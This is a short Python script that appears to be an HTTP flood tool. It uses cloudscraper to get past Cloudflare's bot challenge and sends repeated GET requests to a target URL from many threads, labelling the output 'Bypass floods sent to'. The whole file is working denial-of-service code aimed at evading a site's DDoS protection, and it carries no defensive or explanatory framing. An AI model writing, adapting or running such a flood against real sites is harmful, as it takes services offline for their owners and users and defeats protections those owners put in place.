import threading
import cloudscraper
import requests
import time
import sys

class TimeoutException(Exception):
    pass

def timeout_handler():
    time.sleep(120) 
    raise TimeoutException()

def send_req_bypass_v1(url, packet):
    scraper = cloudscraper.create_scraper()

    for _ in range(packet):
        try:
            t = scraper.get(url, timeout=5)
        except cloudscraper.exceptions.CloudflareChallengeError:
            pass
        except requests.exceptions.ConnectTimeout:
            pass
        except requests.exceptions.RequestException as e:
            pass

def run_threads_bypass_v1(url, packets, threads):
    thread_list = []
    
    for _ in range(threads):
        thread = threading.Thread(target=send_req_bypass_v1, args=(url, packets))
        thread_list.append(thread)
        thread.start()

    for thread in thread_list:
        thread.join()

def bypass_test_v1(url, packets, threads):
    timeout_thread = threading.Thread(target=timeout_handler)
    timeout_thread.start()

    try:
        print("\nBypass floods sent to:")
        print(f"Url: {url}")
        print(f"Packets: {packets}")
        print(f"Threads: {threads}\n")
        
        run_threads_bypass_v1(url, packets, threads)
    except TimeoutException:
        sys.exit(0)
    except KeyboardInterrupt:
        sys.exit(0)

# bypass_test_v1("http://example.com", packets=50, threads=10)
